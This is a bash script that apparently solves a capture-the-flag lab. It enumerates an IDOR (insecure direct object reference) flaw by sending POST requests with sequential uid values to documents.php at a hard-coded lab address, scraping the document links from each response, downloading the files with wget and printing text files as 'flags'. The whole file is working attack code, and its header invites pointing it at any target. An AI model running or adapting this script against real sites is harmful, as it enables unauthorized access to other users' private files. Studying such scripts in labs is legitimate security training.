#!/usr/bin/env bash
# idor_enum.sh
# Simple IDOR enumeration using POST to documents.php (downloads pdf/txt files)
# Edit the URL below to point to your target (no trailing slash required).

set -u
# You can uncomment the next line for debugging if needed:
# set -x

# Base URL (replace with actual host:port or domain). Do NOT include a trailing slash.
url="http://83.136.255.106:37816"

echo "IDOR enumeration, POST request method"
echo "Target: $url"
echo

for i in {1..20}; do
    echo " → uid $i"

    # POST and extract links, then process line-by-line (safe for spaces/chars)
    # Use --data / -d to send POST body. grep -oP pulls /documents/...(.pdf|.txt)
    curl -sS -X POST --data "uid=$i" "$url/documents.php" \
        | grep -oP "/documents/[^'\" ]*\.(pdf|txt)" \
        | sort -u \
        | while IFS= read -r link; do

        # If link is empty, skip to the next iteration
        [[ -z "$link" ]] && continue

        echo " Found: $link"

        # Build full file URL (handles if $url had a trailing slash or not)
        base="${url%/}"
        file_url="${base}${link}"

        # Download and check success (resume if partial, use server-supplied filename if available)
        if wget -q --content-disposition -c --show-progress "$file_url"; then
            # Determine saved filename; prefer basename of link, fall back to basename of URL
            filename="$(basename "$link")"
            # Some servers may send a different filename via Content-Disposition;
            # fallback to checking for the basename if Content-Disposition filename used (most wget saves that filename).
            if [[ ! -f "$filename" ]]; then
                # find any recently downloaded file that matches
                # this is a heuristic; adjust if your server uses different filenames
                # Use globbing for safety
                shopt -s nullglob
                matches=( *"$filename" )
                if ((${#matches[@]} > 0)); then
                    filename="${matches[0]}"
                fi
                shopt -u nullglob
            fi

            echo " Downloaded: $filename"

            # If it's a .txt file, print the first 200 lines (or less)
            if [[ "${filename,,}" == *.txt && -f "$filename" ]]; then
                echo " ---- flag: $filename ----"
                sed -n '1,200p' "$filename"
                echo " ---- end ----"
            fi
        else
            echo " [!] wget failed for: $file_url" >&2
        fi
    done

    echo
done

echo "Done."
